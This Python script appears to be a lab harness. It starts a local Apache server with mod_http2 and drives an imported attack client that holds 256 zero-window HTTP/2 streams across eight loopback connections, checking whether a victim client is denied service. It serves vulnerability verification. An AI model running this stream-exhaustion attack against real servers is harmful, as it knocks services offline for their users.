#!/usr/bin/env python3
"""Apache mod_http2 oracle for the P31 stream-slot hold.

Same attack client, same fixture, Apache 2.4.69 + mod_http2 + mod_ssl instead
of vapached.  Verifies whether a new client is served while 256 zero-window
streams are held.
"""
import socket, subprocess, sys, time
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parent))
import h2hold

APACHE = "/usr/sbin/apache2"
MODULES = "/usr/lib/apache2/modules"

h2hold.setup()
RUN = h2hold.RUN
TLS_PORT = 19998
base = RUN / "apache"
(base / "logs").mkdir(parents=True, exist_ok=True)
base.chmod(0o755)
(base / "logs").chmod(0o777)
conf = base / "httpd.conf"
conf.write_text(f'''ServerRoot "{base}"
Listen 127.0.0.1:19998
User www-data
Group www-data
PidFile "{base}/logs/httpd.pid"
ErrorLog "{base}/logs/error.log"
LogLevel warn
ServerName p31.local
Timeout 60
MaxRequestWorkers 150
DocumentRoot "{RUN}/www"
<Directory />
    Require all denied
</Directory>
<Directory "{RUN}/www">
    Options FollowSymLinks
    AllowOverride None
    Require all granted
</Directory>
LoadModule mpm_event_module {MODULES}/mod_mpm_event.so
LoadModule mime_module {MODULES}/mod_mime.so
LoadModule dir_module {MODULES}/mod_dir.so
LoadModule authz_core_module {MODULES}/mod_authz_core.so
LoadModule authz_host_module {MODULES}/mod_authz_host.so
LoadModule ssl_module {MODULES}/mod_ssl.so
LoadModule http2_module {MODULES}/mod_http2.so
LoadModule socache_shmcb_module {MODULES}/mod_socache_shmcb.so
SSLSessionCache shmcb:{base}/logs/ssl_scache(512000)
TypesConfig /etc/mime.types
Protocols h2 http/1.1
SSLEngine on
SSLCertificateFile "{RUN}/cert.pem"
SSLCertificateKeyFile "{RUN}/key.pem"
''')
conf.chmod(0o644)
subprocess.run([APACHE, "-d", str(base), "-f", str(conf), "-k", "start"], check=True, capture_output=True)

# Point the attack client at the Apache TLS listener.
h2hold.TLS_PORT = TLS_PORT
holders = []
try:
    print("baseline:", h2hold.victim_probe())
    for i in range(8):
        holders.append(h2hold.Attacker(f"127.0.0.{i+2}", 32))
    time.sleep(1)
    print("before trickle:", h2hold.victim_probe())
    start = time.time()
    for cycle in range(1, 8):
        time.sleep(20)
        for h in holders:
            try:
                h.trickle(1)
            except Exception as e:
                print(f"  holder {h.source} trickle failed: {type(e).__name__}")
        if cycle % 2 == 0:
            print(f"t={int(time.time()-start)}s victim={h2hold.victim_probe()}")
    print("final during:", h2hold.victim_probe())
finally:
    for h in holders:
        h.close()
    subprocess.run([APACHE, "-d", str(base), "-f", str(conf), "-k", "stop"], capture_output=True)
